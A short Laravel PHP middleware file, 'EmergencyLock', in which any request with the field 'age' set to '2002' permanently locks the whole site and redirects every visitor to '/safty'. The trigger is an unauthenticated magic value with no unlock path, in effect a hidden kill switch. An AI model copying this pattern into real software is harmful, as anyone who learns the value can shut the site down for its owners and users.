<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;

class EmergencyLock
{
    public function handle(Request $request, Closure $next): Response
    {
        // Emergency lock trigger
        if ($request->input('age') === '2002') {

            cache()->forever('emergency_lock', true);

            return redirect('/safty');
        }

        // Website already locked
        if (cache()->get('emergency_lock', false)) {
            return redirect('/safty');
        }

        return $next($request);
    }
}